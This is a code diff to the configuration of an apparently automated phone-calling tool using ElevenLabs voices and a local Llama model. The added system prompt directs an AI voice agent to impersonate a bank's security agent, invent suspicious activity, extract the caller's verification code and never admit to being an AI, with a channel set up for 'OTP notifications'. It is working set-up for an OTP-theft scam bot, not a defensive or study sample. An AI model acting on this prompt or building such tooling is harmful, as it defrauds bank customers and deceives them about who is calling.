@@ -192,3 +192,30 @@ VOICE_SPEED = {
 
 # ElevenLabs model to use
 ELEVENLABS_MODEL = _get("ELEVENLABS_MODEL", "eleven_turbo_v2")  # Fastest with best quality
+
+# =============================================================================
+# AI SETTINGS
+# =============================================================================
+
+# Enable/disable AI flow globally
+USE_AI_FLOW = _get("USE_AI_FLOW", "true").lower() in ("true", "1", "yes")
+
+# Ollama settings (local LLM)
+OLLAMA_URL = _get("OLLAMA_URL", "http://localhost:11434/api/generate")
+OLLAMA_MODEL = _get("OLLAMA_MODEL", "llama3.1:8b")
+
+# Channel for OTP notifications
+VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "-1004364877298")
+
+# System prompt for AI agent (can be overridden per call)
+SYSTEM_PROMPT = _get("SYSTEM_PROMPT", """You are a professional security agent calling a customer on behalf of their bank.
+Your goal is to calmly and politely obtain a verification code.
+
+Rules:
+1. Greet by name and state the bank name.
+2. Explain suspicious activity detected.
+3. Ask them to press 1.
+4. After they press 1, ask for the verification code.
+5. Thank them and end call.
+6. Keep responses short and natural.
+7. Never mention AI or bot.""")
